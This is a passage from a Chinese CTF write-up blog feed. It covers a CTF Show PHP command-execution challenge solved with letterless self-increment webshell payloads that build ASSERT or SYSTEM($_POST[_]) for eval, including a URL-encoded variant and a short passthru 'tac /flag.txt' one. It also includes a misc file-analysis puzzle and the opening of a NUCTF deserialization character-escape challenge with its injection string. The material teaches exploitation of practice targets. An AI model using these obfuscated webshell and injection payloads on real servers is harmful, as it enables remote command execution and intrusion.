class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>

<p><strong>system()</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=C;//<span class="variable">$_</span>=<span class="variable">$_</span>[0]; //Cprint_r(<span class="variable">$_</span>);<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);//<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // Y<span class="variable">$___</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Tprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Eprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Mprint_r(<span class="variable">$__</span>);print_r(<span class="variable">$___</span>); //SYSTEM<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;//print_r(<span class="variable">$_</span>);<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$____</span>);//_POSTprint_r(<span class="variable">$___</span>);//SYSTEM<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // SYSTEM(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php//<span class="variable">$_</span>=[C];<span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));//<span class="variable">$_</span>=C;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));highlight_file(__FILE__);<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	<span class="built_in">eval</span>(<span class="variable">$a</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get?looklook=1#postctf[show=%24_%3DC%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%24__%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B&amp;_=ls;</span></span><br></pre></td></tr></table></figure>

<p><strong>长度限制：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;);</span></span><br></pre></td></tr></table></figure>

<h2 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h2><p><img src="https://i.loli.net/2021/08/14/Rn7LtWDXEldPBp3.png" alt="image-20210814215714938"></p>
<p>50 4B 03 04 ZIP文件</p>
<p><img src="https://i.loli.net/2021/08/14/KY4lPejVoOUiqbt.png" alt="image-20210814215832498"></p>
<p><img src="https://i.loli.net/2021/08/14/LiNXRJ9SHnwVtEz.png" alt="image-20210814220223592"></p>
<p>这是用来迷惑的</p>
<p>存在一个文本文档，是个 图片，浏览器访问</p>
<p><img src="https://i.loli.net/2021/08/16/78L6POtr1spjlBE.png" alt="image-20210816210645822"></p>
<p>扫描得到    cfhwc19abika_etso{h_u_e_ui1}</p>
<p>查看图片属性</p>
<p><img src="https://i.loli.net/2021/08/16/M1JngkVhvbPIDOC.png" alt="image-20210816211218664"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==<span class="comment"># 不知道怎末用</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/FyR5WpEugQI9ShK.png" alt="image-20210816211549442"></p>
<h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><h2 id="命令执行做题思路"><a href="#命令执行做题思路" class="headerlink" title="命令执行做题思路"></a>命令执行做题思路</h2><ol>
<li><p>一眼就有思路的直接掠过</p>
</li>
<li><p>一眼没有思路的，首先根据正则的过滤分类，决定思路</p>
<ul>
<li><p>有回显？无回显？ eval    exec</p>
</li>
<li><p>eval  还是  system</p>
</li>
<li><p>无字母数字类？</p>
<p>异或？或？取反？自增？</p>
</li>
<li><p>过滤 ;</p>
</li>
<li><p>过滤 ‘ ‘    “ “</p>
</li>
<li><p>找 phpinfo() 看被 ban 的函数名</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NUCTF</title>
    <url>/2021/06/24/NUCTF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>概述：主要考点 — 序列化与反序列化字符逃逸</p>
<span id="more"></span>

<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="1-EasyUnser"><a href="#1-EasyUnser" class="headerlink" title="1 EasyUnser"></a>1 EasyUnser</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// Security filtering function	</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">       <span class="comment">// Security filtering</span></span><br><span class="line">       <span class="variable">$h</span>-&gt;username = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">       <span class="variable">$c</span> = unserialize(filter(serialize(<span class="variable">$h</span>)));</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span>-&gt;password === <span class="string">&#x27;hacker&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>POST 传入参数 username 和 password</li>
<li>题目初始化 <code>public $password = &#39;margin123&#39;;</code> ，而要想获取 flag 必须使 password 为 hacker</li>
<li>根据 PHP 反序列化时遇到 <code>;&#125;</code> 即反序列化结束，我们传入 username 为 <code>margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，希望原本初始化的 password 的值 <code>margin123</code> 失效（被顶出去）</li>
</ol>
</blockquote>
